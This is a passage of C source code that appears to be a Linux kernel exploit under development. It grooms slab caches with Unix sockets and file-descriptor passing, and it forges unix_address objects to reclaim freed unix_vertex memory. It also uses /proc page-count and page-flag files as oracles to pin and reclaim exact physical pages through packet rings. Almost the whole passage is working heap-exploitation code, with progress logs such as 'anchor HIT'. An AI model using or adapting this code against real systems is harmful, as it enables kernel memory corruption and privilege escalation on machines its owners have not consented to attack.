		if (bind(listener, (struct sockaddr *)&address, length) != 0)
			die("bind anchored B listener");
		if (listen(listener, 4) != 0)
			die("listen anchored B listener");
	}
	*client = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (*client < 0)
		die("socket embryo client");
	if (connect(*client, (struct sockaddr *)&address, length) != 0)
		die("connect embryo client");
}

static int send_fds_iov(int sock, const int *fds, size_t count,
			 void *iov_base, size_t iov_len, int flags)
{
	struct msghdr msg = {0};
	struct iovec iov = {
		.iov_base = iov_base,
		.iov_len = iov_len,
	};
	size_t fd_bytes = count * sizeof(int);
	size_t control_len = CMSG_SPACE(fd_bytes);
	unsigned char *control;
	struct cmsghdr *cmsg;
	ssize_t ret;

	control = calloc(1, control_len);
	if (!control)
		return -1;

	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control;
	msg.msg_controllen = control_len;
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(fd_bytes);
	memcpy(CMSG_DATA(cmsg), fds, fd_bytes);

	ret = sendmsg(sock, &msg, flags | MSG_NOSIGNAL);
	free(control);
	if (ret != (ssize_t)iov_len) {
		if (ret >= 0)
			errno = EIO;
		return -1;
	}
	return 0;
}

static int send_fds(int sock, const int *fds, size_t count, char byte)
{
	return send_fds_iov(sock, fds, count, &byte, 1, 0);
}

static int send_one_fd_stack(int sock, int fd, char byte)
{
	unsigned char control[CMSG_SPACE(sizeof(fd))] = {0};
	struct iovec iov = {
		.iov_base = &byte,
		.iov_len = sizeof(byte),
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	ssize_t ret;

	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
	ret = sendmsg(sock, &msg, MSG_NOSIGNAL);
	if (ret != 1) {
		if (ret >= 0)
			errno = EIO;
		return -1;
	}
	return 0;
}

static int send_one_fd_try(int sock, int fd, char byte)
{
	unsigned char control[CMSG_SPACE(sizeof(fd))] = {0};
	struct iovec iov = {
		.iov_base = &byte,
		.iov_len = sizeof(byte),
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	ssize_t ret;

	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
	ret = sendmsg(sock, &msg, MSG_NOSIGNAL | MSG_DONTWAIT);
	if (ret != 1) {
		if (ret >= 0)
			errno = EIO;
		return -1;
	}
	return 0;
}

static int read_rnd96_counts(struct rnd96_counts *counts)
{
	char name[64];
	char line[512];
	unsigned long active;
	unsigned long total;
	unsigned long object_size;
	unsigned long objects_per_slab;
	unsigned long pages_per_slab;
	FILE *file;
	int index;

	memset(counts, 0, sizeof(*counts));
	file = fopen("/proc/slabinfo", "re");
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		int consumed = 0;

		if (sscanf(line, "%63s %lu %lu %lu %lu %lu", name,
			   &active, &total, &object_size, &objects_per_slab,
			   &pages_per_slab) != 6)
			continue;
		if (!strcmp(name, "kmalloc-96")) {
			index = 0;
		} else if (sscanf(name, "kmalloc-rnd-%02d-96%n",
				  &index, &consumed) != 1 ||
			   consumed == 0 || name[consumed] != '\0') {
			continue;
		}
		if (index < 0 || index >= RND_CACHE_COUNT)
			continue;
		counts->active[index] = active;
		counts->total[index] = total;
		counts->objects_per_slab[index] = objects_per_slab;
		counts->pages_per_slab[index] = pages_per_slab;
	}
	fclose(file);
	return 0;
}

static int rnd96_delta(const struct rnd96_counts *before,
			     const struct rnd96_counts *after)
{
	long best_active_delta = 0;
	long best_total_delta = 0;
	int best_index = -1;
	int index;

	for (index = 0; index < RND_CACHE_COUNT; index++) {
		long active_delta = (long)after->active[index] -
				    (long)before->active[index];
		long total_delta = (long)after->total[index] -
				   (long)before->total[index];

		if (total_delta > best_total_delta ||
		    (total_delta == best_total_delta &&
		     active_delta > best_active_delta)) {
			best_total_delta = total_delta;
			best_active_delta = active_delta;
			best_index = index;
		}
	}
	return best_total_delta > 0 || best_active_delta > 0 ?
		best_index : -1;
}

static void oracle_add_vertices(int holder, int fds[ORACLE_BATCH])
{
	size_t index;

	for (index = 0; index < ORACLE_BATCH; index++) {
		fds[index] = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (fds[index] < 0)
			die("socket oracle vertex");
	}
	if (send_fds(holder, fds, ORACLE_BATCH, 'V') != 0)
		die("sendmsg oracle vertices");
}

static void oracle_hold_vertices(int holder[2], int fds[ORACLE_BATCH])
{
	if (make_unix_socketpair(holder) != 0)
		die("socketpair oracle vertices");
	oracle_add_vertices(holder[0], fds);
}

static void store_u64(unsigned char *bytes, size_t offset, uint64_t value)
{
	memcpy(bytes + offset, &value, sizeof(value));
}

static void store_u32(unsigned char *bytes, size_t offset, uint32_t value)
{
	memcpy(bytes + offset, &value, sizeof(value));
}

static uint64_t load_u64(const unsigned char *bytes, size_t offset)
{
	uint64_t value;

	memcpy(&value, bytes + offset, sizeof(value));
	return value;
}

static void build_reclaim_address(struct sockaddr_un *address,
				  uint64_t vertex_a, uint64_t vertex_b,
				  uint64_t cookie)
{
	unsigned char *bytes = (unsigned char *)address;

	memset(address, 0, sizeof(*address));
	address->sun_family = AF_UNIX;
	address->sun_path[0] = '\0';

	/*
	 * unix_address has an eight-byte header. sockaddr bytes 8, 16, 24,
	 * and 32 therefore reclaim unix_vertex offsets 16, 24, 32, and 40.
	 */
	store_u64(bytes, 8, vertex_a + 16);
	store_u64(bytes, 16, vertex_a + 16);
	store_u64(bytes, 24, vertex_b + 32);
	store_u64(bytes, 32, vertex_b + 32);

	/* Keep each abstract address unique outside struct unix_vertex. */
	store_u64(bytes, 80, cookie);
}

static bool reclaim_address_matches(const struct sockaddr_un *address,
				    uint64_t vertex_a, uint64_t vertex_b)
{
	unsigned char object[96] = {0};

	memcpy(object + 8, address, UNIX_TEMPLATE_ADDR_LEN);
	return load_u64(object, 16) == vertex_a + 16 &&
	       load_u64(object, 24) == vertex_a + 16 &&
	       load_u64(object, 32) == vertex_b + 32 &&
	       load_u64(object, 40) == vertex_b + 32;
}

static void oracle_hold_addresses(int fds[ORACLE_BATCH],
				  uint64_t vertex_a, uint64_t vertex_b,
				  uint64_t cookie_base)
{
	struct sockaddr_un address;
	size_t index;

	for (index = 0; index < ORACLE_BATCH; index++) {
		uint64_t cookie = ((uint64_t)getpid() << 32) |
			(cookie_base + index);

		build_reclaim_address(&address, vertex_a, vertex_b, cookie);
		if (!reclaim_address_matches(&address, vertex_a, vertex_b))
			fail("unix_address reclaim template layout mismatch");
		fds[index] = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (fds[index] < 0)
			die("socket oracle unix_address");
		if (bind(fds[index], (struct sockaddr *)&address,
			 UNIX_TEMPLATE_ADDR_LEN) != 0)
			die("bind oracle unix_address");
	}
}

static void verify_address_round_trip(int fd, uint64_t vertex_a,
				      uint64_t vertex_b)
{
	struct sockaddr_un address;
	socklen_t length = sizeof(address);

	memset(&address, 0, sizeof(address));
	if (getsockname(fd, (struct sockaddr *)&address, &length) != 0)
		die("getsockname oracle unix_address");
	if (length != UNIX_TEMPLATE_ADDR_LEN)
		fail("getsockname returned an unexpected unix_address length");
	if (!reclaim_address_matches(&address, vertex_a, vertex_b))
		fail("getsockname changed the unix_address reclaim template");
}

static size_t read_kpagecount(uint64_t *counts, uint64_t start,
			      size_t capacity)
{
	size_t bytes = capacity * sizeof(*counts);
	size_t done = 0;
	int fd;

	fd = open("/proc/kpagecount", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open /proc/kpagecount");
	while (done < bytes) {
		ssize_t ret = pread(fd, (unsigned char *)counts + done,
				    bytes - done,
				    (off_t)(start * sizeof(*counts) + done));

		if (ret < 0)
			die("read /proc/kpagecount");
		if (!ret)
			break;
		done += (size_t)ret;
	}
	close(fd);
	return done / sizeof(*counts);
}

static uint64_t read_kpagecount_at(uint64_t pfn)
{
	uint64_t count;
	ssize_t bytes;
	int fd;

	fd = open("/proc/kpagecount", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open /proc/kpagecount");
	bytes = pread(fd, &count, sizeof(count),
		      (off_t)(pfn * sizeof(count)));
	close(fd);
	if (bytes != (ssize_t)sizeof(count))
		fail("short read from /proc/kpagecount");
	return count;
}

static void prefault_count_array(uint64_t *counts)
{
	size_t index;

	for (index = 0; index < ORACLE_MAX_PFNS; index += KERNEL_PAGE_SIZE /
						      sizeof(*counts))
		counts[index] = 0;
}

static void map_packet_anchor(struct packet_page_anchor *anchor)
{
	anchor->mapping = mmap(NULL, anchor->length,
			       PROT_READ | PROT_WRITE, MAP_SHARED,
			       anchor->fd, 0);
	if (anchor->mapping == MAP_FAILED)
		die("mmap packet page anchor");
}

static uint64_t read_self_pagemap_pfn(const void *address)
{
	const uint64_t pfn_mask = (1ULL << 55) - 1;
	uint64_t entry;
	uint64_t page = (uintptr_t)address / KERNEL_PAGE_SIZE;
	ssize_t bytes;
	int fd;

	fd = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 0;
	bytes = pread(fd, &entry, sizeof(entry),
		      (off_t)(page * sizeof(entry)));
	close(fd);
	if (bytes != (ssize_t)sizeof(entry) || !(entry & (1ULL << 63)))
		return 0;
	return entry & pfn_mask;
}

static bool identify_packet_anchor_from_pagemap(
	struct packet_page_anchor *anchor)
{
	uint64_t first_pfn = 0;
	size_t page;

	for (page = 0; page < anchor->page_count; page++) {
		volatile unsigned char *address =
			anchor->mapping + page * KERNEL_PAGE_SIZE;
		uint64_t pfn;

		oracle_cache_sink += *address;
		pfn = read_self_pagemap_pfn((const void *)address);
		if (!pfn)
			return false;
		if (!page)
			first_pfn = pfn;
		else if (pfn != first_pfn + page)
			fail("packet anchor pagemap PFNs are not contiguous");
	}
	anchor->pfn = first_pfn;
	return true;
}

static void allocate_packet_ring(struct packet_page_anchor *anchor,
				 size_t length)
{
	struct tpacket_req request = {
		.tp_block_size = length,
		.tp_block_nr = 1,
		.tp_frame_size = KERNEL_PAGE_SIZE,
		.tp_frame_nr = length / KERNEL_PAGE_SIZE,
	};
	int version = TPACKET_V1;

	if (!length || length % KERNEL_PAGE_SIZE ||
	    length > UINT32_MAX)
		fail("invalid packet page-anchor length");
	memset(anchor, 0, sizeof(*anchor));
	anchor->fd = -1;
	anchor->length = length;
	anchor->page_count = length / KERNEL_PAGE_SIZE;
	anchor->fd = socket(AF_PACKET, SOCK_RAW | SOCK_CLOEXEC,
			    htons(ETH_P_ALL));
	if (anchor->fd < 0)
		die("socket packet page anchor");
	if (setsockopt(anchor->fd, SOL_PACKET, PACKET_VERSION,
		       &version, sizeof(version)) != 0)
		die("PACKET_VERSION packet page anchor");
	if (setsockopt(anchor->fd, SOL_PACKET, PACKET_RX_RING,
		       &request, sizeof(request)) != 0)
		die("PACKET_RX_RING packet page anchor");
}

static size_t get_max_pfn(void)
{
	FILE *f;
	char line[256];
	unsigned long kb = 0;

	f = fopen("/proc/meminfo", "r");
	if (!f)
		return ORACLE_MAX_PFNS;
	while (fgets(line, sizeof(line), f)) {
		if (sscanf(line, "MemTotal: %lu kB", &kb) == 1)
			break;
	}
	fclose(f);
	if (!kb)
		return ORACLE_MAX_PFNS;
	return (size_t)(kb / 4) + (1 << 20);
}

static bool verify_pfn_candidates(struct packet_page_anchor *anchor,
				   uint64_t *cands, size_t cand_count)
{
	size_t i;
	uint64_t b;
	size_t verified = 0;
	uint64_t verified_pfn = 0;

	if (munmap((void *)anchor->mapping, anchor->length) != 0)
		die("munmap verify");
	anchor->mapping = NULL;
	sleep_usec(1000);

	for (i = 0; i < cand_count; i++) {
		b = read_kpagecount_at(cands[i]);
		map_packet_anchor(anchor);
		if (read_kpagecount_at(cands[i]) == b + 1) {
			verified_pfn = cands[i];
			verified++;
		}
		if (munmap((void *)anchor->mapping, anchor->length) != 0)
			die("munmap verify loop");
		anchor->mapping = NULL;
	}
	if (verified == anchor->page_count) {
		anchor->pfn = verified_pfn;
		map_packet_anchor(anchor);
		return true;
	}
	printf("[O] PFN verify: %zu/%zu passed (expected %zu)\n",
	       verified, cand_count, anchor->page_count);
	return false;
}

static void create_packet_page_anchor(struct packet_page_anchor *anchor,
				      size_t length)
{
	uint64_t *before;
	uint64_t *mapped_once;
	uint64_t *unmapped;
	uint64_t *mapped_twice;
	size_t max_pfn;
	size_t counts[4];
	size_t count;
	unsigned int attempt;
	size_t index;

	allocate_packet_ring(anchor, length);
	map_packet_anchor(anchor);
	if (identify_packet_anchor_from_pagemap(anchor))
		return;
	if (munmap((void *)anchor->mapping, anchor->length) != 0)
		die("munmap packet page pagemap fallback");
	anchor->mapping = NULL;

	max_pfn = get_max_pfn();
	printf("[O] PFN oracle scan range: 0-%zu (%zu GiB)\n",
	       max_pfn, max_pfn / (1 << 18));
	before = calloc(max_pfn, sizeof(*before));
	mapped_once = calloc(max_pfn, sizeof(*mapped_once));
	unmapped = calloc(max_pfn, sizeof(*unmapped));
	mapped_twice = calloc(max_pfn, sizeof(*mapped_twice));
	if (!before || !mapped_once || !unmapped || !mapped_twice)
		die("allocate packet page count snapshots");

	for (attempt = 0; attempt < 6; attempt++) {
		uint64_t cands[64];
		size_t matches = 0;
		uint64_t first_pfn = 0;
		uint64_t pfn = 0;

		counts[0] = read_kpagecount(before, 0, max_pfn);
		map_packet_anchor(anchor);
		counts[1] = read_kpagecount(mapped_once, 0, max_pfn);
		if (munmap((void *)anchor->mapping, anchor->length) != 0)
			die("munmap packet page anchor");
		anchor->mapping = NULL;
		counts[2] = read_kpagecount(unmapped, 0, max_pfn);
		map_packet_anchor(anchor);
		counts[3] = read_kpagecount(mapped_twice, 0, max_pfn);

		count = counts[0];
		for (index = 1; index < ARRAY_SIZE(counts); index++) {
			if (counts[index] < count)
				count = counts[index];
		}
		for (index = 0; index < count; index++) {
			if (mapped_once[index] != before[index] + 1 ||
			    unmapped[index] != before[index] ||
			    mapped_twice[index] != before[index] + 1)
				continue;
			if (!matches)
				first_pfn = index;
			pfn = index;
			if (matches < ARRAY_SIZE(cands))
				cands[matches] = index;
			matches++;
		}
		if (matches == anchor->page_count &&
		    pfn == first_pfn + anchor->page_count - 1) {
			anchor->pfn = first_pfn;
			break;
		}
		if (matches == anchor->page_count &&
		    anchor->page_count > 1) {
			printf("[+] PFN oracle: %zu pages matched "
			       "(non-contiguous), using first PFN %llu\n",
			       matches, (unsigned long long)first_pfn);
			anchor->pfn = first_pfn;
			break;
		}
		printf("[O] packet PFN differential retry %u:"
		       " matches=%zu expected=%zu\n",
		       attempt + 1, matches, anchor->page_count);
		if (matches > anchor->page_count &&
		    matches <= ARRAY_SIZE(cands)) {
			if (munmap((void *)anchor->mapping,
				   anchor->length) != 0)
				die("munmap pre-verify");
			anchor->mapping = NULL;
			if (verify_pfn_candidates(anchor, cands, matches)) {
				printf("[+] PFN verified from %zu candidates\n",
				       matches);
				break;
			}
		} else {
			if (munmap((void *)anchor->mapping,
				   anchor->length) != 0)
				die("munmap packet page differential retry");
			anchor->mapping = NULL;
		}
		sleep_usec(10000);
	}
	free(mapped_twice);
	free(unmapped);
	free(mapped_once);
	free(before);
	if (attempt == 6)
		fail("packet page PFN map-count differential was not unique");
}

static uint64_t read_kpageflag_at(int fd, uint64_t pfn)
{
	uint64_t flags;
	ssize_t bytes;

	bytes = pread(fd, &flags, sizeof(flags),
		      (off_t)(pfn * sizeof(flags)));
	if (bytes != (ssize_t)sizeof(flags))
		fail("short read from /proc/kpageflags");
	return flags;
}

static void release_packet_page_anchor(struct packet_page_anchor *anchor)
{
	struct tpacket_req request = {0};

	if (munmap((void *)anchor->mapping, anchor->length) != 0)
		die("munmap released packet page anchor");
	anchor->mapping = NULL;
	if (setsockopt(anchor->fd, SOL_PACKET, PACKET_RX_RING,
		       &request, sizeof(request)) != 0)
		die("release PACKET_RX_RING page anchor");
	close(anchor->fd);
	anchor->fd = -1;
}

static int wait_for_packet_reclaimable_pfn(uint64_t pfn)
{
	unsigned int waited = 0;
	int flags_fd;

	flags_fd = open("/proc/kpageflags", O_RDONLY | O_CLOEXEC);
	if (flags_fd < 0)
		die("open /proc/kpageflags");
	while (waited < PC_WATCH_TIMEOUT_USEC) {
		uint64_t flags = read_kpageflag_at(flags_fd, pfn);

		if (!(flags & (1ULL << KPF_SLAB))) {
			close(flags_fd);
			return 0;
		}
		sleep_usec(1000);
		waited += 1000;
	}
	close(flags_fd);
	return -1;
}

static void reclaim_exact_pfn_as_packet_page(
	struct packet_page_anchor *winner, uint64_t target_pfn,
	uint64_t direct_map_base, int prepared_fds[PACKET_RECLAIM_CANDIDATES])
{
	size_t candidate;
	int ncpus = (int)sysconf(_SC_NPROCESSORS_ONLN);

	if (ncpus < 1) ncpus = 2;

	for (candidate = 0; candidate < PACKET_RECLAIM_CANDIDATES;
	     candidate++) {
		struct packet_page_anchor current = {0};
		uint64_t before;
		uint64_t after;

		pin_to_cpu((int)(candidate % (size_t)ncpus));
		current.fd = prepared_fds[candidate];
		current.length = KERNEL_PAGE_SIZE;
		current.page_count = 1;
		{
			struct tpacket_req request = {
				.tp_block_size = KERNEL_PAGE_SIZE,
				.tp_block_nr = 1,
				.tp_frame_size = KERNEL_PAGE_SIZE,
				.tp_frame_nr = 1,
			};

			if (setsockopt(current.fd, SOL_PACKET,
				       PACKET_RX_RING, &request,
				       sizeof(request)) != 0)
				die("prepared PACKET_RX_RING reclaim");
		}
		before = read_kpagecount_at(target_pfn);
		map_packet_anchor(&current);
		after = read_kpagecount_at(target_pfn);
		if (after == before + 1) {
			*winner = current;
			winner->pfn = target_pfn;
			winner->direct_map_address =
				direct_map_base +
				target_pfn * KERNEL_PAGE_SIZE;
			printf("[+] exact PFN reclaim hit after %zu packet pages"
			       " on CPU %d\n",
			       candidate + 1,
			       (int)(candidate % (size_t)ncpus));
			return;
		}
		if (munmap((void *)current.mapping,
			   current.length) != 0)
			die("munmap missed packet reclaim");
	}
	fail("packet allocations did not reclaim the target PFN");
}

static int handoff_anchor_to_vertex(struct packet_page_anchor *anchor,
				    int cache_index,
				    int candidate_pair[2],
				    size_t *target_index)
{
	enum {
		WARM_COUNT = 256,
		CANDIDATE_COUNT = 256,
	};
	struct rnd96_counts counts;
	unsigned long previous_total;
	int send_buffer = LARGE_SNDBUF;
	int warm_pair[2];
	int warm_fd;
	int *candidates;
	int flags_fd;
	size_t index;

	candidates = calloc(CANDIDATE_COUNT, sizeof(*candidates));
	if (!candidates)
		die("allocate anchored vertex candidates");
	if (make_unix_socketpair(warm_pair) != 0)
		die("socketpair anchored vertex warmup");
	if (make_unix_socketpair(candidate_pair) != 0)
		die("socketpair anchored vertex candidates");
	if (setsockopt(warm_pair[0], SOL_SOCKET, SO_SNDBUF,
		       &send_buffer, sizeof(send_buffer)) != 0)
		die("SO_SNDBUF anchored vertex warmup");
	if (setsockopt(candidate_pair[0], SOL_SOCKET, SO_SNDBUF,
		       &send_buffer, sizeof(send_buffer)) != 0)
		die("SO_SNDBUF anchored vertex holder");
	warm_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (warm_fd < 0)
		die("socket anchored vertex warmup");
	for (index = 0; index < CANDIDATE_COUNT; index++) {
		candidates[index] = socket(
			AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
		if (candidates[index] < 0)
			die("socket anchored vertex candidate");
	}
	for (index = 0; index < WARM_COUNT; index++) {
		if (send_fds(warm_pair[0], &warm_fd, 1, 'W') != 0)
			die("sendmsg anchored vertex warmup");
	}
	flags_fd = open("/proc/kpageflags", O_RDONLY | O_CLOEXEC);
	if (flags_fd < 0)
		die("open /proc/kpageflags");
	if (read_rnd96_counts(&counts) != 0)
		die("open /proc/slabinfo");
	if (counts.pages_per_slab[cache_index] != 1)
		fail("vertex cache does not use order-0 slabs");
	previous_total = counts.total[cache_index];

	pin_to_cpu(0);
	release_packet_page_anchor(anchor);
	for (index = 0; index < CANDIDATE_COUNT; index++) {
		uint64_t flags;

		flags = read_kpageflag_at(flags_fd, anchor->pfn);
		if (flags & (1ULL << KPF_SLAB))
			fail("anchored page was consumed before a candidate send");
		recv_and_close_fds(warm_pair[1], 1);
		if (send_fds(candidate_pair[0], &candidates[index], 1, 'T') != 0)
			die("sendmsg anchored target vertex");
		flags = read_kpageflag_at(flags_fd, anchor->pfn);
		if (read_rnd96_counts(&counts) != 0)
			die("open /proc/slabinfo");
		if (flags & (1ULL << KPF_SLAB)) {
			printf("[O] vertex handoff candidate=%zu"
			       " total=%lu->%lu page-flags=%#llx\n",
			       index, previous_total,
			       counts.total[cache_index],
			       (unsigned long long)flags);
			if (counts.total[cache_index] <= previous_total)
				fail("another slab cache consumed the anchored page");
			close(flags_fd);
			*target_index = index;
			printf("[+] oracle: candidate fd=%d allocated the first"
			       " vertex in the anchored slab page\n",
			       candidates[index]);
			return candidates[index];
		}
		previous_total = counts.total[cache_index];
	}
	close(flags_fd);
	fail("vertex allocation did not reclaim the anchored packet page");
	return -1;
}

static int classify_vertex_cache_for_pc(
	int *control_fd, int vertex_holder[2], size_t *message_count,
	size_t *objects_per_slab)
{
	struct rnd96_counts before;
	struct rnd96_counts after;
	int vertex_fds[ORACLE_BATCH];
	int vertex_cache = -1;
	int round;

	if (read_rnd96_counts(&before) != 0)
		die("open /proc/slabinfo");
	for (round = 0; round < 64; round++) {
		if (!round) {
			oracle_hold_vertices(vertex_holder, vertex_fds);
			*control_fd = vertex_fds[0];
		} else {
			oracle_add_vertices(vertex_holder[0], vertex_fds);
		}
		if (read_rnd96_counts(&after) != 0)
			die("open /proc/slabinfo");
		vertex_cache = rnd96_delta(&before, &after);
		if (vertex_cache >= 0)
			break;
		before = after;
	}
	if (vertex_cache < 0)
		fail("could not classify the unix_vertex randomized cache");
	if (after.pages_per_slab[vertex_cache] != 1 ||
	    after.objects_per_slab[vertex_cache] == 0 ||
	    after.objects_per_slab[vertex_cache] > 42)
		fail("unexpected unix_vertex slab geometry");
	*objects_per_slab = after.objects_per_slab[vertex_cache];
	*message_count = (size_t)round + 1;
	return vertex_cache;
}

static void anchor_vertex_on_packet_page(
	struct packet_page_anchor *anchor, int cache_index,
	size_t filler_count, bool listener_candidate,
	struct anchored_vertex *vertex)
{
	struct rnd96_counts before;
	struct rnd96_counts after;
	unsigned long target_total;
	int flags_fd;
	int send_buffer = LARGE_SNDBUF;
	size_t queued_in_holder = 0;
	size_t index;
	int drain96_fds[400];
	int drain96_count = 0;

	memset(vertex, 0, sizeof(*vertex));
	vertex->candidate_pairs = calloc(
		ANCHORED_VERTEX_CANDIDATES,
		sizeof(*vertex->candidate_pairs));
	vertex->filler_pairs = calloc(
		filler_count ? filler_count : 1,
		sizeof(*vertex->filler_pairs));
	if (!vertex->candidate_pairs || !vertex->filler_pairs)
		die("allocate anchored vertex socketpairs");
	if (make_unix_socketpair(vertex->holder) != 0)
		die("socketpair anchored vertex holder");
	{
		int wfd = open("/proc/sys/net/core/wmem_max", O_WRONLY);
		if (wfd >= 0) {
			write(wfd, "16777216\n", 9);
			close(wfd);
		}
	}
	if (setsockopt(vertex->holder[0], SOL_SOCKET, SO_SNDBUF_FORCE,
		       &send_buffer, sizeof(send_buffer)) != 0 &&
	    setsockopt(vertex->holder[0], SOL_SOCKET, SO_SNDBUF,
		       &send_buffer, sizeof(send_buffer)) != 0)
		die("SO_SNDBUF anchored vertex holder");

	/* V127: warm per-CPU freelists of socket/unix_sock/file caches on
	 * CPU 0 so that the post-release socketpair() only needs a new
	 * slab page from kmalloc-96 (vertex), not from other caches. */
	pin_to_cpu(0);
	{
		int wpairs[400][2];
		int wcreated = 0, w;
		for (w = 0; w < 400; w++) {
			if (make_unix_socketpair(wpairs[w]) != 0)
				break;
			wcreated++;
		}
		for (w = wcreated - 1; w >= 0; w--) {
			close(wpairs[w][0]);
			close(wpairs[w][1]);
		}
		printf("[D] V127 warmup: %d pairs created+closed\n", wcreated);
		fflush(stdout);
	}
	/* V127: drain kmalloc-96 per-CPU and partial freelists.  Each
	 * socket() creates a vertex in kmalloc-96 and each bind() creates
	 * a unix_address in kmalloc-96 (with addr_len 80 -> alloc 88). */
	{
		struct sockaddr_un daddr;
		memset(&daddr, 0, sizeof(daddr));
		daddr.sun_family = AF_UNIX;
		for (drain96_count = 0; drain96_count < 400; drain96_count++) {
			uint64_t did = 0xd900000000000000ULL |
				(uint64_t)drain96_count;
			drain96_fds[drain96_count] = socket(AF_UNIX,
				SOCK_DGRAM | SOCK_CLOEXEC, 0);
			if (drain96_fds[drain96_count] < 0) break;
			memset(daddr.sun_path, 0, sizeof(daddr.sun_path));
			memcpy(&daddr.sun_path[1], &did, sizeof(did));
			memcpy(&daddr.sun_path[1 + sizeof(did)],
				&attempt_cookie, sizeof(attempt_cookie));
			bind(drain96_fds[drain96_count],
				(struct sockaddr *)&daddr,
				UNIX_GROOM_ADDR_LEN);
		}
		printf("[D] V127 drain: %d sockets bound (2x kmalloc-96)\n",
			drain96_count);
		fflush(stdout);
	}

	flags_fd = open("/proc/kpageflags", O_RDONLY | O_CLOEXEC);
	if (flags_fd < 0)
		die("open /proc/kpageflags");
	if (read_rnd96_counts(&before) != 0)
		die("open /proc/slabinfo");
	pin_to_cpu(0);
	release_packet_page_anchor(anchor);
	printf("[D] V127: anchor PFN %llu released, creating candidates\n",
	       (unsigned long long)anchor->pfn);
	fflush(stdout);

	for (index = 0; index < ANCHORED_VERTEX_CANDIDATES; index++) {
		uint64_t flags;

		if (index && (index % 512) == 0)
			printf("[D] anchor progress %zu/%d (q=%zu)\n",
			       index, ANCHORED_VERTEX_CANDIDATES,
			       queued_in_holder);

		/* V127: create candidate AFTER anchor release so vertex
		 * allocation from kmalloc-96 can land on the freed page. */
		if (listener_candidate) {
			vertex->candidate_pairs[index][0] = socket(
				AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
			vertex->candidate_pairs[index][1] = -1;
			if (vertex->candidate_pairs[index][0] < 0)
				die("socket anchored listener candidate");
		} else if (make_unix_socketpair(
				   vertex->candidate_pairs[index]) != 0) {
			die("socketpair anchored vertex candidate");
		}

		flags = read_kpageflag_at(flags_fd, anchor->pfn);
		if (!(flags & (1ULL << KPF_SLAB))) {
			if (send_one_fd_try(
				    vertex->holder[0],
				    vertex->candidate_pairs[index][0],
				    'A') != 0) {
				if (errno != EAGAIN)
					die("sendmsg anchored vertex candidate");
				{
					size_t drain_q = queued_in_holder / 2;
					if (drain_q < 64) drain_q = 64;
					if (drain_q > queued_in_holder)
						drain_q = queued_in_holder;
					printf("[D] anchor wmem full at %zu, "
					       "drain %zu/%zu\n",
					       index, drain_q,
					       queued_in_holder);
					fflush(stdout);
					for (size_t d = 0; d < drain_q; d++)
						recv_and_close_fds(
							vertex->holder[1], 1);
					queued_in_holder -= drain_q;
				}
				if (send_one_fd_stack(
					    vertex->holder[0],
					    vertex->candidate_pairs[index][0],
					    'A') != 0)
					die("sendmsg anchored vertex after drain");
			}
			queued_in_holder++;
			continue;
		}

		if (read_rnd96_counts(&after) != 0)
			die("open /proc/slabinfo");
		if (after.total[cache_index] <= before.total[cache_index] ||
		    (after.total[cache_index] -
		     before.total[cache_index]) %
			    after.objects_per_slab[cache_index])
			fail("another slab cache consumed anchored vertex page");
		target_total = after.total[cache_index];
		printf("[+] V127: anchor HIT at candidate %zu\n", index);
		fflush(stdout);

		{
			unsigned long partial = before.total[cache_index] -
				before.active[cache_index];
			size_t lead = 0;

			if (partial < 60 - after.objects_per_slab[cache_index])
				lead = 60 - (partial +
					after.objects_per_slab[cache_index]);
			if (index + lead >= ANCHORED_VERTEX_CANDIDATES)
				fail("anchor lead exceeded candidate array");
			for (size_t extra = 0; extra < lead; extra++) {
				index++;
				if (listener_candidate) {
					vertex->candidate_pairs[index][0] =
						socket(AF_UNIX,
						SOCK_STREAM | SOCK_CLOEXEC, 0);
					vertex->candidate_pairs[index][1] = -1;
				} else {
					make_unix_socketpair(
						vertex->candidate_pairs[index]);
				}
				if (send_one_fd_stack(
					    vertex->holder[0],
					    vertex->candidate_pairs[index][0],
					    'L') != 0)
					die("sendmsg anchored vertex lead");
				queued_in_holder++;
			}
			vertex->target_index = index;
			vertex->queued_count = queued_in_holder;
		}
		vertex->filler_count = filler_count;
		for (size_t filler = 0; filler < filler_count; filler++) {
			if (make_unix_socketpair(
				    vertex->filler_pairs[filler]) != 0)
				die("socketpair anchored vertex filler");
			if (send_one_fd_stack(
				    vertex->holder[0],
				    vertex->filler_pairs[filler][0], 'F') != 0)
				die("sendmsg anchored vertex filler");
			queued_in_holder++;
			vertex->queued_count = queued_in_holder;
		}
		if (read_rnd96_counts(&after) != 0)
			die("open /proc/slabinfo");
		if (filler_count &&
		    after.total[cache_index] != target_total)
			printf("[W] filler crossed slab boundary "
			       "(total %lu -> %lu, delta %lu)\n",
			       target_total, after.total[cache_index],
			       after.total[cache_index] - target_total);
		for (int dc = 0; dc < drain96_count; dc++)
			close(drain96_fds[dc]);
		close(flags_fd);
		return;
	}
